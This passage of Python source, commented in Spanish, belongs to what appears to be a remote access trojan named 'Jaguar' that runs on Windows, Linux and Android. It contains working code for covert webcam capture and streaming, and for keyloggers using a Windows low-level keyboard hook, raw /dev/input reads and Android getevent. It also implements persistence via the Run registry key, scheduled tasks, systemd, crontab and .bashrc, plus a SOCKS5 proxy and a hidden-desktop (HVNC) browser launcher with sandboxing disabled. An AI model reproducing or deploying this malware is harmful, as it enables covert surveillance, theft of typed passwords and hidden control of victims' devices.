        return {"bloqueado": True, "via": "keyevent power"}
    if _tiene("xtrlock"):
        try:
            subprocess.Popen(["xtrlock"], **_sin_consola())
        except Exception as e:
            return {"error": str(e)}
        return {"bloqueado": True, "via": "xtrlock"}
    return {"error": "instala xtrlock"}


def _mensaje(a):
    txt = a.get("texto", "")
    if ES_WIN:
        import ctypes
        threading.Thread(
            target=lambda: ctypes.windll.user32.MessageBoxW(0, txt, "Jaguar", 0x40),
            daemon=True).start()
        return {}
    if ES_ANDROID:
        ok, out = _tx("termux-toast", txt, timeout=15)
        return {"ok": ok, "via": "termux-toast", "salida": out}
    for cmd in (["zenity", "--info", "--text", txt],
                ["notify-send", "Jaguar", txt],
                ["xmessage", txt]):
        if _tiene(cmd[0]):
            try:
                subprocess.Popen(cmd, **_sin_consola())
                return {"via": cmd[0]}
            except Exception:
                continue
    return {"error": "instala zenity o notify-send"}


def _abrir_url(a):
    url = a.get("url", "")
    try:
        if ES_WIN:
            os.startfile(url)
        elif ES_ANDROID:
            _root_cmd(f"am start -a android.intent.action.VIEW -d '{url}'", timeout=20)
        elif ES_MAC:
            subprocess.Popen(["open", url])
        else:
            subprocess.Popen(["xdg-open", url])
    except Exception as e:
        return {"error": str(e)}
    return {}


# ===========================================================================
#  Webcam
# ===========================================================================
def _webcam(a):
    if ES_ANDROID and _hay_termux_api():
        idx = int(a.get("cam", 0))
        destino = os.path.join(_HOME, ".jaguar_cam.jpg")
        ok, txt = _tx("termux-camera-photo", "-c", str(idx), destino, timeout=40)
        if not ok and not os.path.isfile(destino):
            return {"b64": "", "error": txt or "termux-camera-photo fallo"}
        try:
            with open(destino, "rb") as f:
                raw = f.read()
            os.remove(destino)
        except Exception as e:
            return {"b64": "", "error": str(e)}
        raw, w, h = _comprimir(raw, 0, 0, "jpeg", 75, 1.0)
        return {"b64": base64.b64encode(raw).decode(), "w": w, "h": h}
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ok, frame = cap.read()
        cap.release()
        if not ok:
            return {"b64": ""}
        ok, buf = cv2.imencode(".jpg", frame)
        return {"b64": base64.b64encode(buf.tobytes()).decode(),
                "w": frame.shape[1], "h": frame.shape[0]}
    except Exception as e:
        return {"b64": "", "error": str(e)}


def _webcam_iniciar(a):
    if _WCAM["on"]:
        return {"estado": "ya activo"}
    _WCAM["on"] = True
    threading.Thread(target=_wcam_loop, args=(int(a.get("cam", 0)),),
                     daemon=True).start()
    return {"estado": "iniciado"}


def _wcam_loop(idx):
    try:
        import cv2
    except Exception:
        _WCAM["on"] = False
        return
    cap = cv2.VideoCapture(idx)
    while _WCAM["on"]:
        try:
            ok, frame = cap.read()
            if ok:
                ok2, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                if ok2:
                    _WCAM["frame"] = buf.tobytes()
                    _WCAM["w"], _WCAM["h"] = frame.shape[1], frame.shape[0]
        except Exception:
            pass
        time.sleep(0.03)
    cap.release()


def _webcam_frame(a):
    if ES_ANDROID and _hay_termux_api():
        return _webcam(a)
    return {"b64": base64.b64encode(_WCAM["frame"]).decode() if _WCAM["frame"] else "",
            "w": _WCAM["w"], "h": _WCAM["h"]}


def _webcam_parar(a):
    _WCAM["on"] = False
    return {"estado": "parado"}


# ===========================================================================
#  Keylogger
# ===========================================================================
_VK_ESP = {0x20: " ", 0x0D: "\n", 0x08: "[BS]", 0x09: "[TAB]", 0x1B: "[ESC]",
           0x2E: "[DEL]", 0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]",
           0x24: "[HOME]", 0x14: "[CAPS]", 0x5B: "[WIN]"}
_VK_SHIFT = {0x31: "!", 0x32: "@", 0x33: "#", 0x34: "$", 0x35: "%", 0x36: "^",
             0x37: "&", 0x38: "*", 0x39: "(", 0x30: ")", 0xBD: "_", 0xBB: "+",
             0xBC: "<", 0xBE: ">", 0xBF: "?", 0xBA: ":", 0xDE: '"', 0xDB: "{",
             0xDD: "}", 0xDC: "|", 0xC0: "~"}
_VK_PLAIN = {0xBD: "-", 0xBB: "=", 0xBC: ",", 0xBE: ".", 0xBF: "/", 0xBA: ";",
             0xDE: "'", 0xDB: "[", 0xDD: "]", 0xDC: "\\", 0xC0: "`"}
_KLOG_HOOK = {"activo": False}


def _vk_texto(vk):
    if vk in _VK_ESP:
        return _VK_ESP[vk]
    try:
        import ctypes
        u = ctypes.windll.user32
        shift = bool(u.GetKeyState(0x10) & 0x8000)
        caps = bool(u.GetKeyState(0x14) & 1)
    except Exception:
        shift, caps = False, False
    if 65 <= vk <= 90:
        return chr(vk) if (shift ^ caps) else chr(vk + 32)
    if 48 <= vk <= 57:
        return _VK_SHIFT.get(vk, chr(vk)) if shift else chr(vk)
    if vk in _VK_PLAIN:
        return _VK_SHIFT.get(vk, _VK_PLAIN[vk]) if shift else _VK_PLAIN[vk]
    if 0x60 <= vk <= 0x69:
        return str(vk - 0x60)
    if 0x70 <= vk <= 0x7B:
        return f"[F{vk - 0x6F}]"
    return ""


# ---- keylogger Linux: lectura directa de /dev/input (stdlib) ----
_EV_KEY = 0x01
_LINUX_MAP = {
    1: "\x1b", 2: ("1", "!"), 3: ("2", "@"), 4: ("3", "#"), 5: ("4", "$"),
    6: ("5", "%"), 7: ("6", "^"), 8: ("7", "&"), 9: ("8", "*"), 10: ("9", "("),
    11: ("0", ")"), 12: ("-", "_"), 13: ("=", "+"), 14: "[BS]", 15: "[TAB]",
    16: ("q", "Q"), 17: ("w", "W"), 18: ("e", "E"), 19: ("r", "R"),
    20: ("t", "T"), 21: ("y", "Y"), 22: ("u", "U"), 23: ("i", "I"),
    24: ("o", "O"), 25: ("p", "P"), 26: ("[", "{"), 27: ("]", "}"),
    28: "\n", 29: "[CTRL]", 30: ("a", "A"), 31: ("s", "S"), 32: ("d", "D"),
    33: ("f", "F"), 34: ("g", "G"), 35: ("h", "H"), 36: ("j", "J"),
    37: ("k", "K"), 38: ("l", "L"), 39: (";", ":"), 40: ("'", '"'),
    41: ("`", "~"), 42: "[LSHIFT]", 43: ("\\", "|"), 44: ("z", "Z"),
    45: ("x", "X"), 46: ("c", "C"), 47: ("v", "V"), 48: ("b", "B"),
    49: ("n", "N"), 50: ("m", "M"), 51: (",", "<"), 52: (".", ">"),
    53: ("/", "?"), 54: "[RSHIFT]", 55: "*", 56: "[ALT]", 57: " ",
    58: "[CAPS]", 59: "[F1]", 60: "[F2]", 61: "[F3]", 62: "[F4]", 63: "[F5]",
    64: "[F6]", 65: "[F7]", 66: "[F8]", 67: "[F9]", 68: "[F10]", 87: "[F11]",
    88: "[F12]", 96: "[ENTER]", 97: "[RCTRL]", 103: "[UP]", 105: "[LEFT]",
    106: "[RIGHT]", 108: "[DOWN]", 110: "[INS]", 111: "[DEL]", 125: "[WIN]",
}
_LINUX_SHIFTS = (42, 54)
_LINUX_LOCK = {"caps": False, "shift": False}


def _klog_linux_loop():
    import glob as _glob
    for d in sorted(_glob.glob("/dev/input/event*")):
        try:
            fh = open(d, "rb", buffering=0)
        except Exception:
            continue
        threading.Thread(target=_klog_evdev_hilo, args=(fh,), daemon=True).start()


def _klog_evdev_hilo(fh):
    while _KLOG_ON:
        try:
            datos = fh.read(24)
        except Exception:
            time.sleep(0.02)
            continue
        if not datos or len(datos) < 24:
            continue
        try:
            _s, _u, tipo, codigo, valor = struct.unpack("llHHi", datos)
        except Exception:
            continue
        if tipo != _EV_KEY or valor != 1:
            continue
        if codigo in _LINUX_SHIFTS:
            _LINUX_LOCK["shift"] = True
            continue
        if codigo == 58:
            _LINUX_LOCK["caps"] = not _LINUX_LOCK["caps"]
            continue
        entrada = _LINUX_MAP.get(codigo)
        if entrada is None:
            continue
        if isinstance(entrada, tuple):
            txt = entrada[1] if (_LINUX_LOCK["shift"] ^ _LINUX_LOCK["caps"]) else entrada[0]
        else:
            txt = entrada
        if txt:
            _KLOG.append(txt)
            if len(_KLOG) > 40000:
                del _KLOG[:-20000]


# ---- keylogger Android: getevent -lt ----
_ANDROID_KEY = {
    "KEY_A": "a", "KEY_B": "b", "KEY_C": "c", "KEY_D": "d", "KEY_E": "e",
    "KEY_F": "f", "KEY_G": "g", "KEY_H": "h", "KEY_I": "i", "KEY_J": "j",
    "KEY_K": "k", "KEY_L": "l", "KEY_M": "m", "KEY_N": "n", "KEY_O": "o",
    "KEY_P": "p", "KEY_Q": "q", "KEY_R": "r", "KEY_S": "s", "KEY_T": "t",
    "KEY_U": "u", "KEY_V": "v", "KEY_W": "w", "KEY_X": "x", "KEY_Y": "y",
    "KEY_Z": "z", "KEY_0": "0", "KEY_1": "1", "KEY_2": "2", "KEY_3": "3",
    "KEY_4": "4", "KEY_5": "5", "KEY_6": "6", "KEY_7": "7", "KEY_8": "8",
    "KEY_9": "9", "KEY_SPACE": " ", "KEY_ENTER": "\n", "KEY_BACKSPACE": "[BS]",
    "KEY_TAB": "[TAB]", "KEY_DOT": ".", "KEY_COMMA": ",", "KEY_MINUS": "-",
    "KEY_APOSTROPHE": "'", "KEY_SLASH": "/", "KEY_AT": "@", "KEY_SEMICOLON": ";",
    "KEY_EQUAL": "=", "KEY_LEFTBRACE": "[", "KEY_RIGHTBRACE": "]",
    "KEY_BACKSLASH": "\\", "KEY_GRAVE": "`", "KEY_LEFTSHIFT": "[LSHIFT]",
    "KEY_RIGHTSHIFT": "[RSHIFT]", "KEY_CAPSLOCK": "[CAPS]",
    "KEY_DEL": "[DEL]", "KEY_FORWARD_DEL": "[DEL]",
}
_klog_android_proc = {"p": None}


def _klog_android_loop():
    try:
        p = subprocess.Popen(["getevent", "-lt"], stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True, errors="replace")
        _klog_android_proc["p"] = p
    except Exception:
        return
    patron = re.compile(r"EV_KEY\s+(\S+)\s+(DOWN|UP)")
    while _KLOG_ON:
        try:
            ln = p.stdout.readline()
        except Exception:
            break
        if not ln:
            time.sleep(0.05)
            continue
        m = patron.search(ln)
        if not m or m.group(2) != "DOWN":
            continue
        txt = _ANDROID_KEY.get(m.group(1))
        if txt and not txt.startswith("["):
            _KLOG.append(txt)
            if len(_KLOG) > 40000:
                del _KLOG[:-20000]


def _klog_hook_loop():
    import ctypes
    from ctypes import wintypes
    u = ctypes.windll.user32
    k = ctypes.windll.kernel32

    class KBDLLHOOKSTRUCT(ctypes.Structure):
        _fields_ = [("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
                    ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
                    ("dwExtraInfo", ctypes.c_void_p)]

    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_int,
                                  wintypes.WPARAM, wintypes.LPARAM)

    def _proc(nCode, wParam, lParam):
        try:
            if nCode == 0 and wParam in (0x0100, 0x0104):
                kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                txt = _vk_texto(int(kb.vkCode))
                if txt:
                    _KLOG.append(txt)
                    if len(_KLOG) > 40000:
                        del _KLOG[:-20000]
        except Exception:
            pass
        return u.CallNextHookEx(None, nCode, wParam, lParam)

    proc = HOOKPROC(_proc)
    h = u.SetWindowsHookExW(13, proc, k.GetModuleHandleW(None), 0)
    if not h:
        return
    _KLOG_HOOK["activo"] = True
    msg = wintypes.MSG()
    while _KLOG_ON:
        try:
            if u.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
                u.TranslateMessage(ctypes.byref(msg))
                u.DispatchMessageW(ctypes.byref(msg))
            else:
                time.sleep(0.004)
        except Exception:
            break
    try:
        u.UnhookWindowsHookEx(h)
    except Exception:
        pass
    _KLOG_HOOK["activo"] = False


def _keylogger_iniciar(a):
    global _KLOG_ON
    if _KLOG_ON:
        return {"estado": "ya activo"}
    _KLOG_ON = True
    if ES_WIN:
        threading.Thread(target=_klog_hook_loop, daemon=True).start()
    elif ES_ANDROID:
        if not _tiene("getevent"):
            return {"error": "getevent no disponible", "estado": "iniciado"}
        threading.Thread(target=_klog_android_loop, daemon=True).start()
    else:
        threading.Thread(target=_klog_linux_loop, daemon=True).start()
    return {"estado": "iniciado", "so": SO}


def _keylogger_leer(a):
    global _KLOG
    txt = "".join(_KLOG)
    _KLOG = []
    return {"texto": txt, "hook": _KLOG_HOOK["activo"] or ES_LINUX or ES_ANDROID}


# ===========================================================================
#  Persistencia
# ===========================================================================
def _exe_actual():
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(sys.argv[0])


def _leer(ruta):
    try:
        with open(ruta, encoding="utf-8", errors="replace") as f:
            return f.read()
    except Exception:
        return ""


def _invocador():
    """Linea para relanzar el agente (soporta .py y binario congelado).

    Congelado, sys.executable YA es el binario: hay que invocarlo directo, no
    con 'python binario' (que fallaria y ademas pondria el binario como host).
    """
    exe = _exe_actual()
    if getattr(sys, "frozen", False):
        return f'"{exe}"'
    return f'"{sys.executable}" "{exe}"'


def _persistir(a=None):
    exe = _exe_actual()
    inv = _invocador()
    hecho = []

    if ES_ANDROID:
        try:
            boot = os.path.join(_HOME, ".termux", "boot")
            os.makedirs(boot, exist_ok=True)
            script = os.path.join(boot, "jaguar.sh")
            with open(script, "w", encoding="utf-8") as f:
                f.write("#!/data/data/com.termux/files/usr/bin/sh\n"
                        "termux-wake-lock 2>/dev/null\n"
                        f"nohup {inv} >/dev/null 2>&1 &\n")
            os.chmod(script, 0o755)
            hecho.append("Termux:Boot")
        except Exception:
            pass
        try:
            rc = os.path.join(_HOME, ".bashrc")
            if "# jaguar-agent" not in _leer(rc):
                with open(rc, "a", encoding="utf-8") as f:
                    f.write(f"\n# jaguar-agent\n{inv} >/dev/null 2>&1 &\n")
                hecho.append(".bashrc")
        except Exception:
            pass
        return {"ok": True, "exe": exe, "vias": hecho,
                "nota": "instala la app Termux:Boot y abrela una vez"}

    if ES_WIN:
        try:
            import winreg as _wr
            k = _wr.OpenKey(_wr.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, _wr.KEY_SET_VALUE)
            _wr.SetValueEx(k, NOMBRE, 0, _wr.REG_SZ, exe)
            _wr.CloseKey(k)
            hecho.append("HKCU\\Run")
        except Exception:
            pass
        try:
            subprocess.run(["schtasks", "/create", "/tn", NOMBRE, "/tr", f'"{exe}"',
                            "/sc", "ONLOGON", "/rl", "HIGHEST", "/f"],
                           capture_output=True, text=True, **_sin_consola())
            hecho.append("schtasks")
        except Exception:
            pass
        return {"ok": True, "exe": exe, "vias": hecho}

    if _tiene("systemctl"):
        try:
            carpeta = os.path.join(_HOME, ".config", "systemd", "user")
            os.makedirs(carpeta, exist_ok=True)
            unidad = os.path.join(carpeta, "jaguar.service")
            with open(unidad, "w", encoding="utf-8") as f:
                f.write("[Unit]\nDescription=Jaguar\n\n"
                        "[Service]\nType=simple\n"
                        f"ExecStart={inv}\nRestart=always\nRestartSec=5\n\n"
                        "[Install]\nWantedBy=default.target\n")
            subprocess.run(["systemctl", "--user", "daemon-reload"],
                           capture_output=True, timeout=15)
            subprocess.run(["systemctl", "--user", "enable", "--now",
                            "jaguar.service"], capture_output=True, timeout=15)
            hecho.append("systemd --user")
        except Exception:
            pass
    if _tiene("crontab"):
        try:
            r = subprocess.run(["crontab", "-l"], capture_output=True, text=True,
                               timeout=10)
            actual = r.stdout or ""
            if "jaguar" not in actual:
                linea = f"@reboot {inv} >/dev/null 2>&1"
                nuevo = actual.rstrip() + "\n# jaguar\n" + linea + "\n"
                p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                p.communicate(nuevo)
                hecho.append("crontab @reboot")
        except Exception:
            pass
    try:
        rc = os.path.join(_HOME, ".bashrc")
        if os.path.isfile(rc) and "# jaguar-agent" not in _leer(rc):
            with open(rc, "a", encoding="utf-8") as f:
                f.write(f"\n# jaguar-agent\n{inv} >/dev/null 2>&1 &\n")
            hecho.append(".bashrc")
    except Exception:
        pass
    return {"ok": True, "exe": exe, "vias": hecho}


# ===========================================================================
#  Proxy SOCKS5 (portable)
# ===========================================================================
def _proxy_iniciar(a):
    global _PROXY_ON
    if _PROXY_ON:
        return {"estado": "ya activo"}
    _PROXY_ON = True
    threading.Thread(target=_socks_loop, args=(int(a.get("puerto", 1080)),),
                     daemon=True).start()
    return {"estado": "proxy SOCKS5 activo"}


def _proxy_parar(a):
    global _PROXY_ON
    _PROXY_ON = False
    return {"estado": "parado"}


def _socks_loop(puerto):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", puerto))
    srv.listen(20)
    while _PROXY_ON:
        try:
            cli, _ = srv.accept()
        except OSError:
            break
        threading.Thread(target=_socks_atender, args=(cli,), daemon=True).start()


def _socks_atender(cli):
    try:
        cli.recv(2)
        cli.sendall(b"\x05\x00")
        _, _, _, atyp = cli.recv(4)
        if atyp == 1:
            host = socket.inet_ntoa(cli.recv(4))
        elif atyp == 3:
            host = cli.recv(cli.recv(1)[0]).decode()
        else:
            host = socket.inet_ntoa(cli.recv(4))
        puerto = struct.unpack(">H", cli.recv(2))[0]
        remoto = socket.socket()
        remoto.connect((host, puerto))
        cli.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + b"\x00\x00")
        _relay(cli, remoto)
    except Exception:
        try:
            cli.close()
        except Exception:
            pass


def _relay(a, b):
    def bombea(src, dst):
        try:
            while True:
                d = src.recv(65536)
                if not d:
                    break
                dst.sendall(d)
        except Exception:
            pass
        try:
            dst.close()
        except Exception:
            pass
    threading.Thread(target=bombea, args=(a, b), daemon=True).start()
    threading.Thread(target=bombea, args=(b, a), daemon=True).start()


def _desconectar(a):
    global _SALIR
    _SALIR = True
    return {"estado": "adios"}


# ===========================================================================
#  HVNC — Windows: desktop oculto | Linux: perfil aislado + ventana
# ===========================================================================
if ES_WIN:
    import ctypes
    from ctypes import wintypes
    try:
        ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass
    _u32 = ctypes.windll.user32
    _k32 = ctypes.windll.kernel32
    _g32 = ctypes.windll.gdi32
    _advapi32 = ctypes.windll.advapi32

    DESKTOP_ALL = 0x01FF
    DESKTOP_ACCESS = 0x000F0000 | DESKTOP_ALL
    DESKTOP_NAME = "JaguarHVNC"
    PW_RENDERFULLCONTENT = 0x00000002
    _CLASES_BROWSER = ("Chrome_WidgetWin_1", "Chrome_WidgetWin_0",
                       "MozillaWindowClass", "ApplicationFrameWindow")
    _CLASES_RENDER = ("Chrome_RenderWidgetHostHWND", "Intermediate D3D Window",
                      "MozillaWindowClass", "Chrome_WidgetWin_1")

    class _STARTUPINFOW(ctypes.Structure):
        _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
                    ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
                    ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                    ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
                    ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
                    ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                    ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
                    ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
                    ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE),
                    ("hStdError", wintypes.HANDLE)]

    class _PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                    ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]

    class _RECT(ctypes.Structure):
        _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                    ("right", ctypes.c_long), ("bottom", ctypes.c_long)]

    class _POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    class _BIH(ctypes.Structure):
        _fields_ = [("biSize", wintypes.DWORD), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", wintypes.WORD),
                    ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                    ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", ctypes.c_long),
                    ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", wintypes.DWORD),
                    ("biClrImportant", wintypes.DWORD)]

    class _BITMAPINFO(ctypes.Structure):
        _fields_ = [("bmiHeader", _BIH), ("bmiColors", wintypes.DWORD * 3)]

    class _SECURITY_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("nLength", wintypes.DWORD),
                    ("lpSecurityDescriptor", ctypes.c_void_p),
                    ("bInheritHandle", wintypes.BOOL)]

    class _SECURITY_DESCRIPTOR(ctypes.Structure):
        _fields_ = [("Revision", ctypes.c_ubyte), ("Sbz1", ctypes.c_ubyte),
                    ("Control", wintypes.WORD), ("Owner", ctypes.c_void_p),
                    ("Group", ctypes.c_void_p), ("Sacl", ctypes.c_void_p),
                    ("Dacl", ctypes.c_void_p)]

    class _GUITHREADINFO(ctypes.Structure):
        _fields_ = [("cbSize", wintypes.DWORD), ("flags", wintypes.DWORD),
                    ("hwndActive", wintypes.HWND), ("hwndFocus", wintypes.HWND),
                    ("hwndCapture", wintypes.HWND), ("hwndMenuOwner", wintypes.HWND),
                    ("hwndMoveSize", wintypes.HWND), ("hwndCaret", wintypes.HWND),
                    ("rcCaret", _RECT)]

    _u32.CreateDesktopW.restype = wintypes.HANDLE
    _u32.OpenDesktopW.restype = wintypes.HANDLE
    _u32.SetThreadDesktop.restype = wintypes.BOOL
    _u32.GetWindowDC.restype = wintypes.HDC
    _u32.ChildWindowFromPointEx.restype = wintypes.HWND
    _u32.GetWindowThreadProcessId.restype = wintypes.DWORD
    _k32.GlobalAlloc.restype = ctypes.c_void_p
    _k32.GlobalLock.restype = ctypes.c_void_p
    _g32.CreateCompatibleDC.restype = wintypes.HDC
    _g32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
    _ENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

_FLAGS_CHROMIUM = (
    "--no-sandbox --disable-gpu-sandbox --disable-gpu --disable-gpu-compositing "
    "--disable-direct-composition --disable-software-rasterizer "
    "--force-device-scale-factor=1 --window-position=0,0 "
    "--disable-features=CalculateNativeWinOcclusion,BackForwardCache,"
    "HardwareMediaKeyHandling,Translate,AcceptCHFrame "
    "--disable-backgrounding-occluded-windows --disable-renderer-backgrounding "
    "--disable-background-timer-throttling --disable-hang-monitor "
    "--disable-ipc-flooding-protection --disable-session-crashed-bubble "
    "--hide-crash-restore-bubble --noerrdialogs --no-first-run"
)

_HVNC = {"pid": None, "hwnd": None, "rw": None, "hdesk": None, "navegador": None,
         "exe": None, "error": None, "estado": "idle", "perfil": None, "hash": None,
         "_sd": None, "activado": False}
_HVNC_CFG = {"calidad": 55, "escala": 0.75, "fps": 10}
_GDI = {"w": 0, "h": 0, "mdc": 0, "bmp": 0, "viejo": 0, "buf": None}
_HVNC_PIDS = []


def _ruta_navegador(nav):
    nav = (nav or "chrome").lower()
    alias = {
        "chrome": ["google-chrome", "chrome", "chromium", "chromium-browser"],
        "google-chrome": ["google-chrome", "chrome"],
        "edge": ["microsoft-edge", "msedge"],
        "msedge": ["microsoft-edge", "msedge"],
        "brave": ["brave-browser", "brave"],
        "opera": ["opera"],
        "firefox": ["firefox"],
    }.get(nav, [nav])

    if ES_WIN:
        try:
            import winreg
            for exe in [a + ".exe" for a in alias]:
                for raiz in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
                    try:
                        k = winreg.OpenKey(raiz, r"SOFTWARE\Microsoft\Windows"
                                                 r"\CurrentVersion\App Paths\\" + exe)
                        ruta = winreg.QueryValueEx(k, "")[0]
                        winreg.CloseKey(k)
                        if ruta and os.path.isfile(ruta):
                            return ruta
                    except Exception:
                        pass
        except Exception:
            pass
        cands = []
        if nav in ("chrome", "google-chrome"):
            cands = [r"%ProgramFiles%\Google\Chrome\Application\chrome.exe",
                     r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe",
                     r"%LocalAppData%\Google\Chrome\Application\chrome.exe"]
        elif nav in ("edge", "msedge"):
            cands = [r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe",
                     r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe"]
        elif nav == "brave":
            cands = [r"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe",
                     r"%LocalAppData%\BraveSoftware\Brave-Browser\Application\brave.exe"]
        elif nav == "firefox":
            cands = [r"%ProgramFiles%\Mozilla Firefox\firefox.exe",
                     r"%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe"]
        for c in cands:
            p = os.path.expandvars(c)
            if p and os.path.isfile(p):
                return p

    for a in alias:
        r = shutil.which(a)
        if r:
            return r
    for c in ("/usr/bin/google-chrome", "/usr/bin/chromium",
              "/usr/bin/chromium-browser", "/usr/bin/brave-browser",
              "/usr/bin/microsoft-edge", "/usr/bin/firefox"):
        if os.path.isfile(c):
            return c
    return None


def _hvnc_iniciar(a):
    nav = (a.get("navegador") or "chrome").lower()
    _HVNC.update({"hwnd": None, "rw": None, "navegador": nav, "error": None,
                  "hash": None, "estado": "arrancando", "activado": False})
    _HVNC["exe"] = _ruta_navegador(nav)
    if not _HVNC["exe"]:
        _HVNC["estado"] = "error"
        _HVNC["error"] = f"navegador no encontrado: {nav}"
        return {"error": _HVNC["error"]}
    _log("HVNC", f"iniciar nav={nav} exe={_HVNC['exe']} so={SO}")
    if ES_WIN:
        threading.Thread(target=_hvnc_trabajo_win, args=(a,), daemon=True).start()
    elif ES_ANDROID:
        threading.Thread(target=_hvnc_trabajo_linux, args=(a,), daemon=True).start()
    else:
        threading.Thread(target=_hvnc_trabajo_linux, args=(a,), daemon=True).start()
    return {"estado": "arrancando", "navegador": nav, "exe": _HVNC["exe"], "so": SO}


# ------------------------------- HVNC Windows ------------------------------
def _sec_dacl_null():
    sd = _SECURITY_DESCRIPTOR()
    _advapi32.InitializeSecurityDescriptor(ctypes.byref(sd), 1)
    _advapi32.SetSecurityDescriptorDacl(ctypes.byref(sd), True, None, False)
    sa = _SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(_SECURITY_ATTRIBUTES)
    sa.lpSecurityDescriptor = ctypes.cast(ctypes.byref(sd), ctypes.c_void_p)
    sa.bInheritHandle = False
    return sa, sd


def _hvnc_crear_desktop():
    if _HVNC.get("hdesk"):
        return _HVNC["hdesk"]
    h = _u32.OpenDesktopW(DESKTOP_NAME, 0, False, DESKTOP_ACCESS)
    if not h:
        sa, sd = _sec_dacl_null()
        h = _u32.CreateDesktopW(DESKTOP_NAME, None, None, 0, DESKTOP_ACCESS,
                                ctypes.byref(sa))
        _HVNC["_sd"] = sd
    _HVNC["hdesk"] = h
    return h


def _hvnc_crear(exe, linea, desktop):
    si = _STARTUPINFOW()
    si.cb = ctypes.sizeof(_STARTUPINFOW)
    si.lpDesktop = "winsta0\\" + desktop
    si.dwFlags = 0x00000001
    si.wShowWindow = 4
    pi = _PROCESS_INFORMATION()
    buf = ctypes.create_unicode_buffer(linea)
    ok = _k32.CreateProcessW(None, buf, None, None, False, 0, None, None,
                             ctypes.byref(si), ctypes.byref(pi))
    if not ok:
        raise OSError(f"CreateProcess fallo err={ctypes.GetLastError()} exe={exe}")
    pid, hproc = pi.dwProcessId, pi.hProcess
    try:
        _k32.CloseHandle(pi.hThread)
    except Exception:
        pass
    return pid, hproc


def _hvnc_lanzar_win(nav, url=None):
    exe = _ruta_navegador(nav)
    if not exe or not os.path.isfile(exe):
        raise FileNotFoundError(f"navegador no encontrado: {nav}")
    perfil = _HVNC.get("perfil")
    if not perfil or not os.path.isdir(perfil):
        perfil = tempfile.mkdtemp(prefix="jaguar_hvnc_")
        _HVNC["perfil"] = perfil
    es_ff = "firefox" in os.path.basename(exe).lower()
    if es_ff:
        partes = [f'"{exe}"', "-no-remote", "-profile", f'"{perfil}"',
                  "-width", "1280", "-height", "800"]
    else:
        partes = [f'"{exe}"', f"--user-data-dir={perfil}",
                  "--window-size=1280,800", "--window-position=0,0",
                  "--no-default-browser-check", _FLAGS_CHROMIUM]
    if url:
        partes.append(f'"{url}"')
    pid, hproc = _hvnc_crear(exe, " ".join(partes), DESKTOP_NAME)
    _log("HVNC", f"lanzado pid={pid} exe={exe}")
    if pid not in _HVNC_PIDS:
        _HVNC_PIDS.append(pid)
    if _k32.WaitForSingleObject(hproc, 1500) == 0:
        codigo = wintypes.DWORD(0)
        _k32.GetExitCodeProcess(hproc, ctypes.byref(codigo))
        _log("HVNC", f"pid={pid} termino en <1.5s exit={codigo.value}")
    try:
        _k32.CloseHandle(hproc)
    except Exception:
        pass
    return pid, perfil


def _hvnc_buscar_ventana():
    hd = _u32.OpenDesktopW(DESKTOP_NAME, 0, False, DESKTOP_ACCESS)
    if not hd:
        return None
    pid_buscado = _HVNC.get("pid")
    por_pid, por_clase = [], []

    def cb(hwnd, lparam):
        try:
            if not _u32.IsWindowVisible(hwnd):
                return True
            r = _RECT()
            _u32.GetWindowRect(hwnd, ctypes.byref(r))
            if (r.right - r.left) < 200 or (r.bottom - r.top) < 150:
                return True
            cls = ctypes.create_unicode_buffer(256)
            _u32.GetClassNameW(hwnd, cls, 256)
            pid = wintypes.DWORD()
            _u32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid_buscado and pid.value == pid_buscado:
                por_pid.append(hwnd)
            elif cls.value in _CLASES_BROWSER:
                por_clase.append(hwnd)
        except Exception:
            pass
        return True

    _u32.EnumDesktopWindows(hd, _ENUMPROC(cb), 0)
    _u32.CloseDesktop(hd)
